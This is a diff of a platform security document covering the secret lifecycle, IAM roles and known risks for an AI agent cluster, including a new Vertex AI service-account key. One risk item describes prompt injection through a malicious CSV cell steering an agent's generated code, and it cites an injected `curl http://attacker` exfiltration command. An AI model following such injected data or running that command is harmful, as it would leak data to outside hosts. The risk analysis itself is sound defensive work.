@@ -12,22 +12,23 @@
 | Untrusted image supply chain | Low | High | Per-namespace Kyverno policy allowlist for image registries (currently the namespaced `agent-egress-policy` is enforced; broader cluster-wide policies are in the internal backlog) |
 | SOPS key compromise | Low | Critical | Age key not committed (gitignored); rotate via `age-keygen` + `sops updatekeys` |
 | Bootstrap SA key compromise | Low | High | Key generated fresh per deploy by `make gcp-bootstrap-key`; ephemeral; no stored encrypted copy can leak |
+| Vertex SA key compromise | Low | Medium | Key generated fresh per deploy by `make kagent-vertex-key`; ephemeral; no stored encrypted copy can leak. SA has `roles/aiplatform.user` only — cannot access storage, IAM, or other GCP surfaces |
 | Supabase service key exposure | Low | Low | Currently dormant (no runtime consumer); SOPS-encrypted at rest |
 
 ## Secret Lifecycle
 
 ```
 Operator's age key (./age.key — gitignored)
-  → SOPS encrypts secrets/{anthropic,langfuse,openai,supabase}.enc.yaml
+  → SOPS encrypts secrets/{langfuse,openai,supabase}.enc.yaml
   → Committed to git (ciphertext only)
   → make deploy invokes Make targets that decrypt and apply during _vm-bootstrap
-    (langfuse-secret, _anthropic-secret, gcp-bootstrap-key generates fresh)
+    (langfuse-secret; gcp-bootstrap-key and kagent-vertex-key generate fresh keys)
   → K8s Secrets in source namespaces (kagent-system, observability,
     crossplane-system)
   → Reflector replicates downstream copies into agent-* namespaces
-  → Mounted as env vars or files into Pods (ANTHROPIC_API_KEY env var on
-    kagent app + agent pods; ar-pull-secret as imagePullSecrets on agent
-    Pod templates; gcp-sa-key as a file mount on the sandbox)
+  → Mounted as env vars or files into Pods (GOOGLE_APPLICATION_CREDENTIALS env var
+    + /var/secrets/google volume on kagent app container; ar-pull-secret as
+    imagePullSecrets on agent Pod templates; gcp-sa-key as a file mount on the sandbox)
 ```
 
 ## Sandbox Isolation
@@ -55,6 +56,9 @@ Bootstrap SA (`whisperops-bootstrap@{project}`) is granted these roles unconditi
 - `roles/resourcemanager.projectIamAdmin` (so Crossplane can write `ProjectIAMMember`)
 - `roles/artifactregistry.writer`
 
+Kagent Vertex SA (`whisperops-kagent-vertex@{project}`) is granted:
+- `roles/aiplatform.user` — the minimum role for Gemini inference. Does not grant `aiplatform.serviceAgent` (fine-tuning) or `aiplatform.admin`. The SA key is mounted on the kagent `app` container and read via `GOOGLE_APPLICATION_CREDENTIALS`.
+
 The bindings are unconditional because IAM Conditions don't gate `*.create` operations: at create time the resource has no name, so any `resource.name.startsWith("agent-")` condition evaluates false and blocks Crossplane's per-agent SA provisioning. The naming convention is enforced at the Backstage scaffolder layer instead. Blast radius is bounded at "who can scaffold via Backstage." A production deployment would re-add Conditions for `get/update/delete` operations (where `resource.name` is populated), or move off kind to GKE Autopilot with Workload Identity.
 
 Per-agent SA (provisioned by Crossplane, one per agent namespace):
@@ -77,6 +81,7 @@ Per-agent SA (provisioned by Crossplane, one per agent namespace):
 
 1. **Prompt injection via dataset content**: A malicious value in a CSV cell could influence Analyst code generation. Mitigation: sandbox NetworkPolicy restricts egress to GCS + DNS + OTel collector, so an injected `curl http://attacker` cannot reach external hosts.
 2. **Project-wide bootstrap SA blast radius**: Unconditional IAM bindings on the bootstrap SA mean that anyone with kubectl access in `crossplane-system` can pivot to provision arbitrary `agent-*`-named resources. Mitigation today is access control on the operator's workstation (gcloud auth + age key). Future mitigation: GKE migration + Workload Identity.
+3a. **Vertex SA key blast radius**: The `kagent-vertex-credentials` Secret is replicated to all `agent-*` namespaces via Reflector. A compromised agent-namespace pod that reads its own secret volume could issue Vertex AI calls billed to the project. Mitigation: `roles/aiplatform.user` is inference-only; no storage or IAM access. Future mitigation: per-agent Workload Identity when GKE is available.
 3. **Langfuse cost-tracking latency**: There is a ~60 s delay between LLM spend and budget enforcement. An agent could overspend by up to one poll cycle's worth of queries before scale-to-zero fires. The kill-switch path is also currently fragile and tracked in the internal backlog.
 4. **Kind cluster single-node**: No HA; VM failure means full platform downtime. Production would use GKE Autopilot.
 5. **sslip.io reveals the VM IP in every hostname**: Acceptable for prototype scope; replace with real wildcard DNS for production.
